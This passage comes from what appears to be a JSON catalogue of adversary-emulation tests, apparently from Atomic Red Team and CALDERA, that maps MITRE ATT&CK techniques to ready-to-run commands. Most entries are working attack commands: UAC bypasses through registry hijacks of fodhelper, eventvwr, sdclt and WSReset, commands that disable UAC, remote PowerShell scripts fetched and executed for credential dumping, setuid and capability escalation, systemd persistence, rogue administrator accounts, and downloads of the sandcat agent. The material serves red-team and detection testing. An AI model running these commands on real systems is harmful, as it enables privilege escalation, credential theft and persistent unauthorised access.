         "technique_name": "Phishing: Spearphishing Attachment",
         "tactic": "initial-access",
         "description": "Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.\nUpon execution, CMD will be launched and ping 8.8.8.8.\n",
         "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (iwr \"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\" -UseBasicParsing); $macrocode = \"   Open `\"C:\\Users\\Public\\art.jse`\" For Output As #1`n   Write #1, `\"WScript.Quit`\"`n   Close #1`n   Shell`$ `\"ping 8.8.8.8`\"`n\"; Invoke-MalDoc -macroCode $macrocode -officeProduct \"Word\""
      },
      {
         "technique_id": "T1566.001",
         "technique_name": "Phishing: Spearphishing Attachment",
         "tactic": "initial-access",
         "description": "This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.\nThe file \"PhishingAttachment.xlsm\" is downloaded to the %temp% directory.\n",
         "command": "$url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri $url -OutFile $env:TEMP\\PhishingAttachment.xlsm"
      }
   ],
   "T1592.001": [
      {
         "technique_id": "T1592.001",
         "technique_name": "Gather Victim Host Information: Hardware",
         "tactic": "reconnaissance",
         "description": "Enumerate PlugNPlay Camera using powershell commandlet. this technique was seen in dcrat malware backdoor capabilities where it enumerate the camera info mounted on the compromised host. reference: https://www.mandiant.com/resources/analyzing-dark-crystal-rat-backdoor\n",
         "command": "Get-CimInstance -Query \"SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')\""
      }
   ],
   "T1548.002": [
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Bypasses User Account Control using a fileless method, registry only.\nUpon successful execution, sdclt.exe will spawn cmd.exe to spawn notepad.exe\n[Reference - sevagas.com](http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass)\nAdapted from [MITRE ATT&CK Evals](https://github.com/mitre-attack/attack-arsenal/blob/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/stepFourteen_bypassUAC.ps1)\n",
         "command": "New-Item -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Value 'cmd.exe /c notepad.exe'; New-ItemProperty -Force -Path \"HKCU:\\Software\\Classes\\Folder\\shell\\open\\command\" -Name \"DelegateExecute\"; Start-Process -FilePath $env:windir\\system32\\sdclt.exe; Start-Sleep -s 3"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "UAC Bypass DccwBypassUAC technique via function of WinPwn",
         "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Leo Davidson derivative\n\nType:\tDll Hijack\n\nMethod: IFileOperation\n\nTarget:\t\\system32\\pkgmgr.exe\n\nComponent: DismCore.dll\n\nImplementation:\tucmDismMethod\n\nUCM Method:\tUacMethodDISM\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\23 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Creates a fake \"trusted directory\" and copies a binary to bypass UAC. The UAC bypass may not work on fully patched systems\nUpon execution the directory structure should exist if the system is patched, if unpatched Microsoft Management Console should launch\n",
         "command": "mkdir \"\\\\?\\C:\\Windows \\System32\\\" && copy \"C:\\Windows\\System32\\cmd.exe\" \"\\\\?\\C:\\Windows \\System32\\mmc.exe\" && mklink c:\\testbypass.exe \"\\\\?\\C:\\Windows \\System32\\mmc.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "UAC bypass using Magic technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique magic"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "UAC bypass using DiskCleanup technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\cmd.exe\" -technique DiskCleanup"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "The following UAC bypass is focused on a registry key under \"HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command\" that will trigger a command once wsreset.exe runs. \nThis bypass is limited to Windows 10 1803/1809 and may not run on Server platforms. The registry mod is where interest will be.\nIf successful, the command to run will spawn off wsreset.exe. \n[UAC Bypass in Windows 10 Store Binary](https://0x1.gitlab.io/exploit/UAC-Bypass-in-Windows-10-Store-Binary/)\n",
         "command": "New-Item HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Force | Out-Null; New-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"DelegateExecute\" -Value \"\" -Force | Out-Null; Set-ItemProperty -Path HKCU:\\Software\\Classes\\AppX82a6gwre4fdg3bt635tn5ctqjf8msdd2\\Shell\\open\\command -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe /c start cmd.exe\" -Force -ErrorAction SilentlyContinue | Out-Null; $Process = Start-Process -FilePath \"C:\\Windows\\System32\\WSReset.exe\" -WindowStyle Hidden"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "PowerShell code to bypass User Account Control using ComputerDefaults.exe on Windows 10\nUpon execution administrative command prompt should open\n",
         "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\ComputerDefaults.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Disable User Account Conrol (UAC) for admin by setting the registry key \nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ConsentPromptBehaviorAdmin to 0.\n\n[MedusaLocker Ransomware](https://cloudsek.com/technical-analysis-of-medusalocker-ransomware/), \n[Purple Fox Rootkit](https://blogs.blackberry.com/en/2022/01/threat-thursday-purple-fox-rootkit), \n[Avaddon Ransomware](https://blogs.blackberry.com/en/2021/06/threat-thursday-avaddon-ransomware-uses-ddos-attacks-as-triple-threat)\n",
         "command": "$orgValue =(Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin; Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name ConsentPromptBehaviorAdmin -Value 0 -Type Dword -Force"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tShell API\n\nMethod: Environment variables expansion\n\nTarget:\t\\system32\\svchost.exe via \\system32\\schtasks.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDiskCleanupEnvironmentVariable\n\nUCM Method:\tUacMethodDiskSilentCleanup\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\34 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privalages\n",
         "command": "New-Item \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\mscfile\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\eventvwr.msc\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: James Forshaw\n\nType:\tAppInfo ALPC\n\nMethod: RAiLaunchAdminProcess and DebugObject\n\nTarget:\tAttacker defined\n\nComponent:\tAttacker defined\n\nImplementation:\tucmDebugObjectMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\59 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\sdclt.exe\n\nComponent: Attacker defined\n\nImplementation:\tucmSdcltIsolatedCommandMethod\n\nUCM Method:\tUacMethodShellSdclt\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\31 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Hashim Jawad\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\WSReset.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodShellWSReset\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\56 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Bypasses User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privileges. \n",
         "command": "reg.exe add hkcu\\software\\classes\\mscfile\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && cmd.exe /c eventvwr.msc"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: winscripting.blog\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\fodhelper.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodMsSettings2\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\33 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Bypass UAC using SilentCleanup task on Windows 8-10 using bat file from https://www.reddit.com/r/hacking/comments/ajtrws/bypassing_highest_uac_level_windows_810/\n\nThere is an auto-elevated task called SilentCleanup located in %windir%\\system32\\cleanmgr.exe This can be abused to elevate any file with Administrator privileges without prompting UAC (even highest level).\n\nFor example, we can set the windir registry kye to: \"cmd /k REM \"\n\nAnd forcefully run SilentCleanup task:\n\nschtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I\n\nREM will tell it to ignore everything after %windir% and treat it just as a NOTE. Therefore just executing cmd with admin privs.\n",
         "command": "\"bc40cf_T1548.002.bat\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Disable User Account Conrol (UAC) using the builtin tool reg.exe by changing its registry key\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\EnableLUA from 1 to 0\n",
         "command": "reg.exe ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA /t REG_DWORD /d 0 /f"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Bypasses User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution, \"The operation completed successfully.\" will be shown twice and command prompt will be opened.\n",
         "command": "reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /ve /d \"C:\\Windows\\System32\\cmd.exe\" /f && reg.exe add hkcu\\software\\classes\\ms-settings\\shell\\open\\command /v \"DelegateExecute\" /f && fodhelper.exe"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Enigma0x3/bytecode77 derivative by Nassim Asrir\n\nType:\tShell API\n\nMethod: Registry key manipulation\n\nTarget:\t\\system32\\slui.exe, \\system32\\changepk.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmShellRegModMethod\n\nUCM Method:\tUacMethodDebugObject\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\61 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "User Account Control (UAC) is a security mechanism for limiting the elevation of privileges, including administrative accounts, unless authorized. \nThis setting ensures that the elevation prompt is only used in secure desktop mode.\nDisable User Account Conrol (UAC) for secure desktop by setting the registry key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\PromptOnSecureDesktop to 0.\n",
         "command": "Set-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System -Name PromptOnSecureDesktop -Value 0 -Type Dword -Force"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "UAC bypass using ccmstp technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); UACBypass -noninteractive -command \"C:\\windows\\system32\\calc.exe\" -technique ccmstp"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "PowerShell code to bypass User Account Control using the Windows 10 Features on Demand Helper (fodhelper.exe). Requires Windows 10.\nUpon execution command prompt will be opened.\n",
         "command": "New-Item \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Force; New-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force; Set-ItemProperty \"HKCU:\\software\\classes\\ms-settings\\shell\\open\\command\" -Name \"(default)\" -Value \"C:\\Windows\\System32\\cmd.exe\" -Force; Start-Process \"C:\\Windows\\System32\\fodhelper.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Account Control",
         "tactic": "multiple",
         "description": "Executes User Account Control Bypass according to the methods listed below. Upon successful execution you should see event viewer load and two administrative command prompts.\nNote: The cleanup_command's which kill the spawned cmd and event viewer processes only work if run as admin.\n\nAuthor: Stefan Kanthak\n\nType:\tDll Hijack\n\nMethod: .NET Code Profiler\n\nTarget:\t\\system32\\mmc.exe\n\nComponent:\tAttacker defined\n\nImplementation:\tucmCorProfilerMethod\n\nUCM Method:\tUacMethodCorProfiler\n\nhttps://github.com/hfiref0x/UACME\n",
         "command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\uacme\\39 Akagi64.exe\""
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
         "tactic": "privilege-escalation",
         "description": "UIPI bypass with uiAccess application",
         "command": "$url=\"#{server}/file/download\";\n$wc=New-Object System.Net.WebClient;\n$wc.Headers.add(\"platform\",\"windows\");\n$wc.Headers.add(\"file\",\"sandcat.go\");\n$wc.Headers.add(\"server\",\"#{server}\");\n$wc.Headers.add(\"defaultSleep\",\"60\");\n$wc.Headers.add(\"defaultGroup\",\"bypassed_u_bro\");\n$data=$wc.DownloadData($url);\n$name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\");\n[io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n.\\Akagi64.exe 32 \"C:\\Users\\Public\\$name.exe -server #{server}\"\n"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
         "tactic": "privilege-escalation",
         "description": "Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe",
         "command": ".\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
         "tactic": "privilege-escalation",
         "description": "executes the slui exe file handler hijack",
         "command": ".\\Akagi64.exe 45 C:\\Windows\\System32\\cmd.exe\n"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
         "tactic": "privilege-escalation",
         "description": "Set a registry key to allow UAC bypass",
         "command": "New-ItemProperty -Path HKLM:Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system -Name EnableLUA -PropertyType DWord -Value 0 -Force\n"
      },
      {
         "technique_id": "T1548.002",
         "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control",
         "tactic": "privilege-escalation",
         "description": "Bypass user account controls - medium",
         "command": "$url=\"#{server}/file/download\"; $wc=New-Object System.Net.WebClient; $wc.Headers.add(\"platform\",\"windows\"); $wc.Headers.add(\"file\",\"sandcat.go\"); $data=$wc.DownloadData($url); $name=$wc.ResponseHeaders[\"Content-Disposition\"].Substring($wc.ResponseHeaders[\"Content-Disposition\"].IndexOf(\"filename=\")+9).Replace(\"`\"\",\"\"); [io.file]::WriteAllBytes(\"C:\\Users\\Public\\$name.exe\",$data);\n$job = Start-Job -ScriptBlock { Import-Module -Name .\\Bypass-UAC.ps1; Bypass-UAC -Command \"C:\\Users\\Public\\$name.exe -group #{group}\"; };\nReceive-Job -Job $job -Wait;\n"
      }
   ],
   "T1053.006": [
      {
         "technique_id": "T1053.006",
         "technique_name": "Scheduled Task/Job: Systemd Timers",
         "tactic": "multiple",
         "description": "Schedule a system level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
         "command": "systemd-run --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'"
      },
      {
         "technique_id": "T1053.006",
         "technique_name": "Scheduled Task/Job: Systemd Timers",
         "tactic": "multiple",
         "description": "This test creates Systemd service and timer then starts and enables the Systemd timer \n",
         "command": "echo \"[Unit]\" > /etc/systemd/system/art-timer.service; echo \"Description=Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.service; echo \"[Service]\" >> /etc/systemd/system/art-timer.service; echo \"Type=simple\" >> /etc/systemd/system/art-timer.service; echo \"ExecStart=/bin/touch /tmp/art-systemd-timer-marker\" >> /etc/systemd/system/art-timer.service; echo \"[Install]\" >> /etc/systemd/system/art-timer.service; echo \"WantedBy=multi-user.target\" >> /etc/systemd/system/art-timer.service; echo \"[Unit]\" > /etc/systemd/system/art-timer.timer; echo \"Description=Executes Atomic Red Team Systemd Timer Service\" >> /etc/systemd/system/art-timer.timer; echo \"Requires=art-timer.service\" >> /etc/systemd/system/art-timer.timer; echo \"[Timer]\" >> /etc/systemd/system/art-timer.timer; echo \"Unit=art-timer.service\" >> /etc/systemd/system/art-timer.timer; echo \"OnCalendar=*-*-* *:*:00\" >> /etc/systemd/system/art-timer.timer; echo \"[Install]\" >> /etc/systemd/system/art-timer.timer; echo \"WantedBy=timers.target\" >> /etc/systemd/system/art-timer.timer; systemctl start art-timer.timer; systemctl enable art-timer.timer; systemctl daemon-reload"
      },
      {
         "technique_id": "T1053.006",
         "technique_name": "Scheduled Task/Job: Systemd Timers",
         "tactic": "multiple",
         "description": "Schedule a user level transient task (will not survive a reboot) without having to create the .timer or .service files by using the systemd-run command. \n",
         "command": "systemd-run --user --unit=Atomic-Red-Team --on-calendar '*:0/1' /bin/sh -c 'echo \"$(date) $(whoami)\" >>/tmp/log'"
      }
   ],
   "T1548.001": [
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "This test simulates a command that can be run to enumerate files that have the setuid bit set\n",
         "command": "find /usr/bin -perm -4000"
      },
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "This test gives a file the capability to set UID without using flags.\n",
         "command": "touch /tmp/evilBinary; sudo setcap cap_setuid=ep /tmp/evilBinary"
      },
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "Make, change owner, and change file attributes on a C source code file\n",
         "command": "cp; sudo chown root /tmp/hello.c; sudo make /tmp/hello; sudo chown root /tmp/hello; sudo chmod u+s /tmp/hello; /tmp/hello"
      },
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "This test sets the SetUID flag on a file in Linux and macOS.\n",
         "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod u+xs /tmp/evilBinary"
      },
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "This test simulates a command that can be run to enumerate files that have the setgid bit set\n",
         "command": "find /usr/bin -perm -2000"
      },
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "Make and modify [capabilities](https://man7.org/linux/man-pages/man7/capabilities.7.html) of a C source code file.\nThe binary doesn't have to modify the UID, but the binary is given the capability to arbitrarily modify it at any time with `setuid(0)`.\nWithout being owned by root, the binary can set the UID to 0.\n",
         "command": "cp; make /tmp/cap; sudo setcap cap_setuid=ep /tmp/cap; /tmp/cap"
      },
      {
         "technique_id": "T1548.001",
         "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid",
         "tactic": "multiple",
         "description": "This test sets the SetGID flag on a file in Linux and macOS.\n",
         "command": "sudo touch /tmp/evilBinary; sudo chown root /tmp/evilBinary; sudo chmod g+xs /tmp/evilBinary"
      }
   ],
   "T1078.003": [
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "Loot local Credentials - Safetykatz technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); safedump -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "A system administrator may have locked and expired a user account rather than deleting it. \"the user is coming back, at some stage\" An adversary may reactivate a inactive account in an attempt to appear legitimate. \n\nIn this test we create a \"art\" user with the password art, lock and expire the account, try to su to art and fail, unlock and renew the account, su successfully, then delete the account.\n",
         "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art; usermod --lock art; usermod --expiredate \"1\" art; usermod --unlock art; usermod --expiredate \"99999\" art; su art; whoami; exit"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "After execution the new account will be active and added to the Administrators group",
         "command": "dscl . -create /Users/AtomicUser; dscl . -create /Users/AtomicUser UserShell /bin/bash; dscl . -create /Users/AtomicUser RealName \"Atomic User\"; dscl . -create /Users/AtomicUser UniqueID 503; dscl . -create /Users/AtomicUser PrimaryGroupID 503; dscl . -create /Users/AtomicUser NFSHomeDirectory /Local/Users/AtomicUser; dscl . -passwd /Users/AtomicUser mySecretPassword; dscl . -append /Groups/admin GroupMembership AtomicUser"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "After execution the current/new user will have root access",
         "command": "dsenableroot; dsenableroot -u art-tester -p art-tester -r art-root"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "Loot local Credentials - powerhell kittie technique via function of WinPwn",
         "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); obfuskittiedump -consoleoutput -noninteractive"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "After execution the current/new user will be added to the Admin group",
         "command": "dseditgroup -o edit -a art-user -t user admin"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "An adversary may wish to create an account with admin privileges to work with. In this test we create a \"art\" user with the password art, switch to art, execute whoami, exit and delete the art user.\n",
         "command": "useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art; su art; whoami; exit"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "After execution the new account will be active and added to the Administrators group",
         "command": "net user art-test /add && net user art-test #{password} && net localgroup administrators art-test /add"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "After execution the new account will be active and added to the Administrators group",
         "command": "sysadminctl interactive -addUser art-tester -fullName ARTUser -password !pass123! -admin"
      },
      {
         "technique_id": "T1078.003",
         "technique_name": "Valid Accounts: Local Accounts",
         "tactic": "multiple",
         "description": "An adversary may try to re-purpose a system account to appear legitimate. In this test change the login shell of the nobody account, change its password to nobody, su to nobody, exit, then reset nobody's shell to /usr/sbin/nologin.\n",
